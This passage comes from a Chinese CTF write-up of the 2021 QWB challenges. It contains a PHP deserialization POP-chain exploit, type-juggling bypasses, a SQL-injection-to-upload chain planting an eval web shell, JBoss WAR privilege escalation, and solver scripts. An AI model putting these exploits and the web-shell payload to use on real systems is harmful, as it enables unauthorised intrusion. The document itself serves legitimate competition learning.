class="token keyword">def</span> <span class="token function">getmVar</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> method<span class="token punctuation">)</span><span class="token punctuation">:</span>    pos <span class="token operator">=</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span>method <span class="token operator">+</span> <span class="token string">"("</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> i<span class="token punctuation">[</span>pos <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">:</span>pos <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">getmMeth</span><span class="token punctuation">(</span>lines<span class="token punctuation">,</span> method<span class="token punctuation">)</span><span class="token punctuation">:</span>    mflag <span class="token operator">=</span> <span class="token number">0</span>    mtmp <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> lines<span class="token punctuation">:</span>        <span class="token keyword">if</span> method <span class="token keyword">in</span> i<span class="token punctuation">:</span>            <span class="token triple-quoted-string string">'''if "public function " in i:                print("get defination:" )                print(i)                break'''</span>            <span class="token keyword">if</span> <span class="token string">"->"</span> <span class="token operator">+</span> method <span class="token operator">+</span> <span class="token string">"("</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"get invocation in line "</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>mflag <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">":"</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>                mVar <span class="token operator">=</span> getmVar<span class="token punctuation">(</span>i<span class="token punctuation">,</span> method<span class="token punctuation">)</span>                tmflag <span class="token operator">=</span> mflag                <span class="token keyword">while</span> <span class="token string">"public function "</span> <span class="token keyword">not</span> <span class="token keyword">in</span> mtmp<span class="token punctuation">:</span>                    <span class="token triple-quoted-string string">'''if mVar + " = " + mVar in mtmp:                        s = ""                        ifexp = lines[tmflag]                        ifexpnum = re.findall("[(](.*?)[)]", ifexp)                        s = s.join(ifexpnum)                        if eval(s):                            print("var has been polluted by method 's ifexp")                            print(ifexp)                            print("----------------------")                            return'''</span>                    <span class="token keyword">if</span> mVar<span class="token operator">+</span><span class="token string">"="</span> <span class="token keyword">in</span> mtmp<span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"var has been polluted"</span><span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"----------------------"</span><span class="token punctuation">)</span>                        <span class="token keyword">return</span>                    mtmp <span class="token operator">=</span> lines<span class="token punctuation">[</span>tmflag<span class="token punctuation">]</span>                    tmflag <span class="token operator">-=</span> <span class="token number">1</span>                mpos <span class="token operator">=</span> mtmp<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"function "</span><span class="token punctuation">)</span>                mMethod <span class="token operator">=</span> mtmp<span class="token punctuation">[</span>mpos <span class="token operator">+</span> <span class="token number">9</span><span class="token punctuation">:</span>mpos <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">]</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"method's method is "</span><span class="token operator">+</span>mMethod<span class="token punctuation">)</span>                <span class="token keyword">if</span> mMethod <span class="token operator">!=</span> <span class="token string">"U710q7"</span><span class="token punctuation">:</span>                    getmMeth<span class="token punctuation">(</span>lines<span class="token punctuation">,</span> mMethod<span class="token punctuation">)</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"get!!!!!!!!!"</span><span class="token punctuation">)</span>                    exit<span class="token punctuation">(</span><span class="token punctuation">)</span>        mflag <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">def</span> <span class="token function">geteMeth</span><span class="token punctuation">(</span>lines<span class="token punctuation">,</span> tflag<span class="token punctuation">,</span> eVar<span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">while</span> <span class="token string">"public function "</span> <span class="token keyword">not</span> <span class="token keyword">in</span> tmp<span class="token punctuation">:</span>        <span class="token comment"># 查找是否有直接赋值污染变量</span>        <span class="token keyword">if</span> eVar<span class="token operator">+</span><span class="token string">"="</span> <span class="token keyword">in</span> tmp<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"var has been polluted"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"----------------------"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token comment"># 查找是否有if语句后污染变量</span>        <span class="token triple-quoted-string string">'''if eVar+" = "+eVar+"." in tmp:            s = ""            ifexp = lines[tflag]            ifexpnum = re.findall("[(](.*?)[)]", ifexp)            s = s.join(ifexpnum)            if eval(s):                print("var has been polluted by ifexp")                print("----------------------")                return'''</span>        tmp <span class="token operator">=</span> lines<span class="token punctuation">[</span>tflag<span class="token punctuation">]</span>        tflag <span class="token operator">-=</span> <span class="token number">1</span>    mpos <span class="token operator">=</span> tmp<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"function "</span><span class="token punctuation">)</span>    method <span class="token operator">=</span> tmp<span class="token punctuation">[</span>mpos<span class="token operator">+</span><span class="token number">9</span><span class="token punctuation">:</span>mpos<span class="token operator">+</span><span class="token number">9</span><span class="token operator">+</span><span class="token number">6</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"eval's method is "</span> <span class="token operator">+</span> method<span class="token punctuation">)</span>    getmMeth<span class="token punctuation">(</span>lines<span class="token punctuation">,</span> method<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No FOUND"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"----------------------"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">geteVar</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>    epos <span class="token operator">=</span> e<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"eval"</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> e<span class="token punctuation">[</span>epos <span class="token operator">+</span> <span class="token number">5</span><span class="token punctuation">:</span>epos <span class="token operator">+</span> <span class="token number">11</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">geteval</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"class.php"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        flag <span class="token operator">=</span> <span class="token number">0</span>        num <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> lines<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token string">"eval"</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-------------------------------"</span><span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"get eval in line"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>flag<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">", total:"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>                eVar <span class="token operator">=</span> geteVar<span class="token punctuation">(</span>i<span class="token punctuation">)</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"eVar is "</span> <span class="token operator">+</span> eVar<span class="token punctuation">)</span>                geteMeth<span class="token punctuation">(</span>lines<span class="token punctuation">,</span> flag<span class="token punctuation">,</span> eVar<span class="token punctuation">)</span>                num <span class="token operator">+=</span> <span class="token number">1</span>            flag <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"class.php"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>    lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token number">0</span>    num <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> lines<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"eval"</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>            epos <span class="token operator">=</span> i<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"eval"</span><span class="token punctuation">)</span>            eVar <span class="token operator">=</span> geteVar<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            geteMeth<span class="token punctuation">(</span>lines<span class="token punctuation">,</span> flag<span class="token punctuation">,</span> eVar<span class="token punctuation">)</span>            <span class="token keyword">break</span>        flag<span class="token operator">+=</span><span class="token number">1</span>geteval<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>flag{42a17bce-75b3-4e4e-a073-e5ec1bb4a218}</p><h2 id="赌徒-done-Err0r"><a href="#赌徒-done-Err0r" class="headerlink" title="赌徒 | done | Err0r"></a>赌徒 | done | Err0r</h2><p>扫目录发现<code>www.zip</code></p><p>发现是反序列化，exp：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">Start</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">_sayhello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token single-quoted-string string">'ok'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"hi"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">_sayhello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$cc</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"give you flag : "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">flag</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$promise</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">promise</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">promise</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ffiillee</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'ffiilleennaammee'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Room</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token operator">=</span><span class="token single-quoted-string string">'/flag'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token single-quoted-string string">''</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__get</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">Get_hint</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$hint</span><span class="token operator">=</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$hint</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Get_hint</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Room</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">a</span><span class="token operator">=</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'filename'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">-</span><span class="token operator">></span> name <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>直接读<code>/flag</code></p><p>解码得flag</p><img src="/article/2021qwb/image-20210613212339286-4170472.png" class="" title="image-20210613212339286" loading="lazy"><h2 id="寻宝-SOLVED-Err0r"><a href="#寻宝-SOLVED-Err0r" class="headerlink" title="寻宝 | SOLVED | Err0r"></a>寻宝 | SOLVED | Err0r</h2><h2 id="信息一"><a href="#信息一" class="headerlink" title="信息一"></a>信息一</h2><p>绕就完事，要求能过<code>is_numeric</code>函数，利用变量覆盖赋值</p><h3 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h3><p><code>$num1 &gt; 1024</code></p><p>直接<code>1025a</code>即可</p><h3 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h3><p><code>isset($num2) &amp;&amp; strlen($num2) &lt;= 4 &amp;&amp; intval($num2 + 1) &gt; 500000</code></p><p>科学计数法绕过<code>9e9</code></p><h3 id="第三层"><a href="#第三层" class="headerlink" title="第三层"></a>第三层</h3><p><code>isset($num3) &amp;&amp; &#39;4bf21cd&#39; === substr(md5($num3),0,7)</code></p><p>爆md5<code>61823470</code></p><h3 id="第四层"><a href="#第四层" class="headerlink" title="第四层"></a>第四层</h3><p><code>!($num4 &lt; 0)&amp;&amp;($num4 == 0)&amp;&amp;($num4 &lt;= 0)&amp;&amp;(strlen($num4) &gt; 6)&amp;&amp;(strlen($num4) &lt; 8)&amp;&amp;isset($num4)</code></p><p>直接<code>aaaaaaa</code></p><h3 id="第五层"><a href="#第五层" class="headerlink" title="第五层"></a>第五层</h3><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$num5</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$num5</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token variable">$b</span><span class="token operator">=</span><span class="token function">json_decode</span><span class="token punctuation">(</span>@<span class="token variable">$num5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token variable">$b</span> <span class="token operator">===</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">===</span> <span class="token boolean constant">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                                    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"第五层"</span><span class="token punctuation">;</span>                                    <span class="token keyword">include</span> <span class="token single-quoted-string string">'KeY1lhv.php'</span><span class="token punctuation">;</span>                                    <span class="token keyword">echo</span> <span class="token variable">$KEY1</span><span class="token punctuation">;</span>                                <span class="token punctuation">&#125;</span></code></pre><p>随便输个<code>a</code>过了…</p><p>拿到KEY1<code>KEY1&#123;e1e1d3d40573127e9ee0480caf1283d6&#125;</code></p><h2 id="信息二"><a href="#信息二" class="headerlink" title="信息二"></a>信息二</h2><p>下载发现一大堆docx文档，估计在文档里找KEY2，写脚本</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""# -*- coding: utf-8 -*-@File: findkey2.py@Author: gyy@Time: 6月 13, 2021"""</span><span class="token keyword">import</span> os<span class="token keyword">import</span> docx<span class="token keyword">def</span> <span class="token function">show_files</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> all_files<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 首先遍历当前目录所有文件及文件夹</span>    file_list <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>path<span class="token punctuation">)</span>    <span class="token comment"># 准备循环判断每个元素是否是文件夹还是文件，是文件的话，把名称传入list，是文件夹的话，递归</span>    <span class="token keyword">for</span> <span class="token builtin">file</span> <span class="token keyword">in</span> file_list<span class="token punctuation">:</span>        <span class="token comment"># 利用os.path.join()方法取得路径全名，并存入cur_path变量，否则每次只能遍历一层目录</span>        cur_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>path<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token punctuation">)</span>        <span class="token comment"># 判断是否是文件夹</span>        <span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>isdir<span class="token punctuation">(</span>cur_path<span class="token punctuation">)</span><span class="token punctuation">:</span>            show_files<span class="token punctuation">(</span>cur_path<span class="token punctuation">,</span> all_files<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token string">".doc"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> <span class="token builtin">file</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            all_files<span class="token punctuation">.</span>append<span class="token punctuation">(</span>cur_path<span class="token punctuation">)</span>    <span class="token keyword">return</span> all_files<span class="token comment"># 传入空的list接收文件名</span>contents <span class="token operator">=</span> show_files<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment"># 循环打印show_files函数返回的文件名列表</span>key <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> content <span class="token keyword">in</span> contents<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-=-=-=-=-="</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token builtin">file</span> <span class="token operator">=</span> docx<span class="token punctuation">.</span>Document<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> paragraph <span class="token keyword">in</span> <span class="token builtin">file</span><span class="token punctuation">.</span>paragraphs<span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token string">"KEY"</span> <span class="token keyword">in</span> paragraph<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"FIND IT!!!!!\n"</span><span class="token operator">+</span>paragraph<span class="token punctuation">.</span>text<span class="token punctuation">)</span>            key<span class="token punctuation">.</span>append<span class="token punctuation">(</span>paragraph<span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"NOT FOUND!"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nALL DONE!"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span></code></pre><p>得到</p><pre class="language-none"><code class="language-none">[&#39;xxx&#39;, &#39;xxx&#39;, &#39;KEY2&#123;T5fo0Od618l91SlG6l1l42l3a3ao1nblfsS&#125;&#39;, &#39;xxx&#39;, &#39;xxx&#39;, &#39;xxx&#39;, &#39;xxx&#39;, &#39;xxx&#39;, &#39;xxx&#39;, &#39;xxx&#39;]</code></pre><p>然后提交KEY1和KEY2得flag</p><img src="/article/2021qwb/image-20210613213530156-4170508.png" class="" title="image-20210613213530156" loading="lazy"><h2 id="Easyweb-SOLVED-D0gekong"><a href="#Easyweb-SOLVED-D0gekong" class="headerlink" title="Easyweb | SOLVED | D0gekong"></a>Easyweb | SOLVED | D0gekong</h2><p>打开网址发现有三个东西，查看源码</p><img src="/article/2021qwb/image-20210613213721349-4170518.png" class="" title="image-20210613213721349" loading="lazy"><p>发现路由，都下载下来，有用的hint，其他没用</p><pre class="language-none"><code class="language-none">Try to scan 35000-40000 ^_^.All tables are empty except for the table where the username and password are locatedTable: employee</code></pre><p>nmap爆端口</p><img src="/article/2021qwb/image-20210613213837935-4170530.png" class="" title="image-20210613213837935" loading="lazy"><p>得到36842端口，访问发现是登陆界面，给了表名 应该就是注入，试了下发现有回显报错，直接sqlmap跑</p><p>用户名：admin</p><p>密码：99f609527226e076d668668582ac4420</p><p>登陆成功</p><p>扫描发现<code>/file</code>路由有文件上传</p><img src="/article/2021qwb/image-20210614132600977-4170551.png" class="" title="image-20210614132600977" loading="lazy"><p><code>.php</code>绕过过滤</p><p>然后<code>./.php?1=shell.php&amp;2=&lt;?php eval($_POST[1]);?&gt;</code></p><p>连上shell，需要提权。扫进程和端口，没啥收获，最终应该是打JAVA的jboss</p><p>frp穿出来，根据文章<a href="https://blog.csdn.net/weixin_43999372/article/details/88364032">https://blog.csdn.net/weixin_43999372/article/details/88364032</a></p><p>制作war包，上传后拿到root，读取根目录flag：</p><p>flag{V3ry_v3rY_E3si_a_w3B_Ch@1l3ng3}</p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a><strong>Re</strong></h1><h2 id="Easymath-SOLVED-Hn13"><a href="#Easymath-SOLVED-Hn13" class="headerlink" title="Easymath | SOLVED | Hn13"></a>Easymath | SOLVED | Hn13</h2><p>将字符串两个一组拆分并做short int传入函数判断相等，dbl数组用于比较。跟进去sub_13f3函数。</p><p>经过多组数据测试发现v3(i+1)与v(i)近似相等，因此v3 = 2.718281828459045 - (double)i * v3两边的v3可以看作近似相等，(i+1)v3=2.718281828459045，但是由于循环传入的值不能取得，因此相比答案i的值应该进一步-1，即(flag+2)*dbl=e,flag=e/dbl-2，然后int端序与字符相反，再反一下即可得到正确答案。</p><p>脚本：</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> struct<span class="token keyword">import</span> mathsegs <span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0.00009794904266317233</span><span class="token punctuation">,</span><span class="token number">0.00010270456917442</span><span class="token punctuation">,</span><span class="token number">0.00009194256152777895</span><span class="token punctuation">,</span><span class="token number">0.0001090322021913372</span>，<span class="token number">0.0001112636336217534</span><span class="token punctuation">,</span><span class="token number">0.0001007442677411854</span><span class="token punctuation">,</span><span class="token number">0.0001112636336217534</span><span class="token punctuation">,</span><span class="token number">0.0001047063607908828</span><span class="token punctuation">,</span><span class="token number">0.0001112818534005219</span><span class="token punctuation">,</span><span class="token number">0.0001046861985862495</span><span class="token punctuation">,</span><span class="token number">0.0001112818534005219</span>，<span class="token number">0.000108992856167966</span><span class="token punctuation">,</span><span class="token number">0.0001006882924839248</span><span class="token punctuation">,</span><span class="token number">0.0001112590796092291</span><span class="token punctuation">,</span><span class="token number">0.0001089841164633298</span><span class="token punctuation">,</span><span class="token number">0.00008468431512187874</span><span class="token punctuation">]</span>flag <span class="token operator">=</span> <span class="token string">b""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> segs<span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>e<span class="token operator">/</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>flag <span class="token operator">+=</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">"&lt;H"</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token builtin">round</span><span class="token punctuation">(</span>math<span class="token punctuation">.</span>e<span class="token operator">/</span>i<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre><p>脚本跑完直接出flag：flag{saam_dim_gei_lei_jam_caa_sin_laa}</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python dict的小发现</title>
      <link href="article/pythondict/"/>
      <url>article/pythondict/</url>
      
